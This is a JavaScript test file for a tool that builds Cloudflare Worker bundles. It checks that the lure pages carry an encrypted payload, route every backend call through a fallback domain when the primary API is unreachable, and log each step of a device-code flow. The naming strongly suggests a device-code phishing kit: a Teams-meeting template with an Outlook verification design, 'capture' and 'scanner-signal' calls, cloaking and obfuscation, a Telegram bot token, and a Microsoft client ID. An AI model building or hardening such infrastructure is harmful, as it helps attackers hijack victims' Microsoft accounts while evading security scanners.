/**
 * Verifies the API-domain-split device-code fix:
 *
 *   1. buildWorkerScript() bakes VERIFY_ENDPOINT_FALLBACK (the panel domain)
 *      and resolves every placeholder.
 *   2. The worker-served page has an EMPTY __API_BASE, so vg-engine.js calls
 *      relative /api/* paths that resolve to the worker itself - never a
 *      possibly-unreachable API domain.
 *   3. backendFetch() actually retries the fallback: with the primary
 *      endpoint unreachable, the worker's /api/verify still returns the
 *      backend's response (this is the device-code killer).
 *   4. When the primary is healthy the fallback is not touched, and a worker
 *      built without a fallback (pre-existing links) still works.
 */
const path = require('path');
const fs = require('fs');
const ROOT = path.resolve(__dirname, '..', '..');

process.env.SESSION_SECRET = process.env.SESSION_SECRET || 'testsessionsecret0000000000000000';
process.env.JWT_SECRET = process.env.JWT_SECRET || 'testjwtsecret0000000000000000000000';
process.env.ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || '0000000000000000000000000000000000000000000000000000000000000000';
process.env.ADMIN_SETUP_KEY = process.env.ADMIN_SETUP_KEY || 'x';
process.env.TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'x';
process.env.CF_API_TOKEN = process.env.CF_API_TOKEN || 'x';
process.env.CF_ACCOUNT_ID = process.env.CF_ACCOUNT_ID || 'x';
process.env.AZURE_CLIENT_ID = process.env.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
// The user's real configuration: both domains set.
process.env.API_URL = 'https://api.example.com';
process.env.APP_URL = 'https://app.example.com';

const dbState = { obfuscation: false };
const dbPath = require.resolve(path.join(ROOT, 'backend', 'database', 'connection.js'));
require.cache[dbPath] = {
  id: dbPath, filename: dbPath, loaded: true,
  exports: {
    query: async (sql) => {
      if (/FROM settings/i.test(String(sql))) {
        return [[{ setting_key: 'obfuscation_enabled', setting_value: dbState.obfuscation ? 'true' : 'false' }], []];
      }
      return [[], []];
    },
    getConnection: async () => ({ query: async () => [[], []], release: () => {} }),
    pool: { query: async () => [[], []] },
  },
};

const templateLoader = require(path.join(ROOT, 'backend', 'services', 'templateloader.js'));
const crypto = require('crypto');
const { execFileSync } = require('child_process');

let pass = 0, fail = 0;
function check(name, cond, extra) {
  if (cond) { pass++; console.log('  PASS  ' + name); }
  else { fail++; console.log('  FAIL  ' + name + (extra ? '  -> ' + extra : '')); }
}

function makeLink() {
  return {
    id: 1, template_type: 'teams-meeting2', verification_design: 'outlook',
    title_text: 'Test', message_text: 'msg', button_text: 'Go',
    file_name: 'file.pdf', pages: 1, destination_url: 'https://example.com',
    turnstile_enabled: true,
  };
}
const makeUser = () => ({ id: 1, cf_workers_subdomain: 'testsub', cf_api_token: 't', cf_account_id: 'a' });

// Mirror of encryptPayload()/the export bootstrap (see vg-cloak.test.js).
function decryptExportPayload(bundle) {
  if (typeof bundle !== 'string') return null;
  const mC = bundle.match(/var C=\\\"([A-Za-z0-9+/=]+)\\\"/);
  const mS = bundle.match(/var S=\\\"([A-Za-z0-9+/=]+)\\\"/);
  const mI = bundle.match(/var I=\\\"([A-Za-z0-9+/=]+)\\\"/);
  if (!mC || !mS || !mI) return null;
  try {
    const cb = Buffer.from(mC[1], 'base64');
    const salt = Buffer.from(mS[1], 'base64');
    const iv = Buffer.from(mI[1], 'base64');
    const key = crypto.pbkdf2Sync(salt, salt, 100000, 32, 'sha512');
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAAD(Buffer.from('VG-TEMPLATE-2024'));
    decipher.setAuthTag(cb.subarray(cb.length - 16));
    return Buffer.concat([decipher.update(cb.subarray(0, cb.length - 16)), decipher.final()]).toString('utf8');
  } catch (e) { return null; }
}

function windowVars(pageHtml) {
  const m = pageHtml.match(/atob\("([A-Za-z0-9+/=]+)"\)/);
  if (!m) return null;
  try { return JSON.parse(Buffer.from(m[1], 'base64').toString('utf8')); } catch (e) { return null; }
}

// Run the real worker bundle in a window-less child with a mocked fetch.
// primaryDown=true -> the API domain is unreachable (DNS/proxy not ready).
function runWorker(worker, primaryDown) {
  const bundlePath = path.join('/tmp', 'vc-dcverify-' + Date.now() + '-' + Math.random().toString(36).slice(2) + '.mjs');
  const checker = [
    'globalThis.self = globalThis;',
    'globalThis.fetch = async function (url, init) {',
    '  var u = String(url);',
    '  if (u.indexOf("api.example.com") !== -1) {',
    '    if (' + primaryDown + ') throw new Error("ENOTFOUND api.example.com");',
    '    return new Response(JSON.stringify({ valid: true, tenant: "t", client_id: "c", _from: "primary" }), { status: 200 });',
    '  }',
    '  if (u.indexOf("app.example.com") !== -1) {',
    '    return new Response(JSON.stringify({ valid: true, tenant: "t", client_id: "c", _from: "fallback" }), { status: 200 });',
    '  }',
    '  throw new Error("unexpected url: " + u);',
    '};',
    'import(process.argv[1]).then(async function (m) {',
    '  var req = new Request("https://link1.testsub.workers.dev/api/verify", {',
    '    method: "POST",',
    '    headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" },',
    '    body: JSON.stringify({ token: "tok" })',
    '  });',
    '  var r = await m.default.fetch(req, {}, { waitUntil: function (p) { return p; } });',
    '  var body = null; try { body = await r.json(); } catch (e) { body = { _err: "not json" }; }',
    '  console.log(JSON.stringify({ status: r.status, body: body }));',
    '}).catch(function (e) { console.log(JSON.stringify({ importError: e.message })); });',
  ].join('\n');
  try {
    fs.writeFileSync(bundlePath, worker);
    const out = execFileSync(process.execPath, ['--input-type=module', '-e', checker, bundlePath], { stdio: 'pipe', timeout: 60000 }).toString().trim();
    const lines = out.split('\n').filter(l => l.trim());
    return JSON.parse(lines[lines.length - 1]);
  } catch (e) {
    return { spawnError: e.message };
  } finally {
    try { fs.unlinkSync(bundlePath); } catch (e) { /* ignore */ }
  }
}

async function main() {
  const link = makeLink();
  const user = makeUser();

  console.log('\n== 1. Placeholder baking ==');
  const worker = await templateLoader.buildWorkerScript(link, user, 'https://api.example.com');
  check('bundle built', !!worker && worker.length > 1000, 'len=' + (worker || '').length);
  check('primary VERIFY_ENDPOINT = API_URL',
    /VERIFY_ENDPOINT\s*=\s*['"]https:\/\/api\.example\.com['"]/.test(worker));
  check('fallback VERIFY_ENDPOINT_FALLBACK = APP_URL',
    /VERIFY_ENDPOINT_FALLBACK\s*=\s*['"]https:\/\/app\.example\.com['"]/.test(worker));
  const unresolved = (worker.match(/['"]\{\{[A-Z_]+\}\}['"]/g) || []);
  check('no unresolved placeholders', unresolved.length === 0, JSON.stringify(unresolved));
  // 9 = the 7 flow calls (scanner-signal, block-check, 3x verify, capture,
  // log) plus the reportDevCode() -> /api/log mirror and the diag() channel.
  // Every backend call must go through backendFetch() so the fallback origin is
  // used when the primary API domain is not answering.
  check('all 9 backend call sites routed through backendFetch',
    (worker.match(/backendFetch\('/g) || []).length === 9,
    'count=' + (worker.match(/backendFetch\('/g) || []).length);

  console.log('\n== 2. Page uses relative API paths ==');
  const page = decryptExportPayload(worker);
  check('embedded page decrypts', !!page && page.length > 1000, 'len=' + (page || '').length);
  const wv = windowVars(page || '');
  check('window vars decode', !!wv, page ? 'no atob() blob found' : 'no page');
  check('__API_BASE is EMPTY (page calls the worker, not the API domain)',
    wv && wv.__API_BASE === '', JSON.stringify(wv && wv.__API_BASE));
  check('page still carries the device-code relative fallback in vg-engine',
    (page || '').includes('/api/device/start'));

  console.log('\n== 3. Fallback behaviour ==');
  const primaryDown = runWorker(worker, true);
  check('primary unreachable -> worker still answers /api/verify',
    primaryDown.status === 200 && primaryDown.body && primaryDown.body.valid === true,
    JSON.stringify(primaryDown));
  check('response came from the FALLBACK (panel domain)',
    primaryDown.body && primaryDown.body._from === 'fallback',
    JSON.stringify(primaryDown.body));

  const primaryUp = runWorker(worker, false);
  check('primary healthy -> served from the primary (no fallback)',
    primaryUp.status === 200 && primaryUp.body && primaryUp.body._from === 'primary',
    JSON.stringify(primaryUp));

  console.log('\n== 4. Backwards compatibility (no fallback baked) ==');
  const legacy = worker.replace(/(VERIFY_ENDPOINT_FALLBACK\s*=\s*)["']https:\/\/app\.example\.com["']/, "$1''");
  const legacyUp = runWorker(legacy, false);
  check('legacy bundle still serves /api/verify when the primary is healthy',
    legacyUp.status === 200 && legacyUp.body && legacyUp.body.valid === true,
    JSON.stringify(legacyUp));
  const legacyDown = runWorker(legacy, true);
  check('legacy bundle surfaces the backend error when the primary is down',
    legacyDown.status === 500 || !!legacyDown.body || !!legacyDown.spawnError || !!legacyDown.importError,
    JSON.stringify(legacyDown));

  console.log('\n== 5. Diagnostic channel reaches the backend ==');
  check('diag() channel present and routed through backendFetch',
    /function diag\(step, detail, waitUntil\)/.test(worker));
  check('device-code verify call is tagged caller=devicecode',
    /caller: 'devicecode'/.test(worker));
  check('page verify call is tagged caller=page',
    /caller: 'page'/.test(worker));
  check('worker /api/verify proxy is tagged caller=worker-verify',
    /caller: 'worker-verify'/.test(worker));
  const diagSteps = ['REQ', 'DEVSTART_ENTRY', 'VERIFY_OK', 'TURNSTILE_OK', 'MS_RESPONSE', 'SUCCESS', 'GATE_BLOCK', 'NO_ROUTE'];
  check('every diagnostic step is recorded in the bundle',
    diagSteps.every(function (s) { return worker.indexOf("diag('" + s + "',") !== -1; }),
    'missing: ' + diagSteps.filter(function (s) { return worker.indexOf("diag('" + s + "',") === -1; }).join(','));

  console.log('\n==== ' + pass + ' passed, ' + fail + ' failed ====\n');
  process.exit(fail ? 1 : 0);
}

main().catch(e => { console.error('VERIFY ERROR:', e); process.exit(2); });
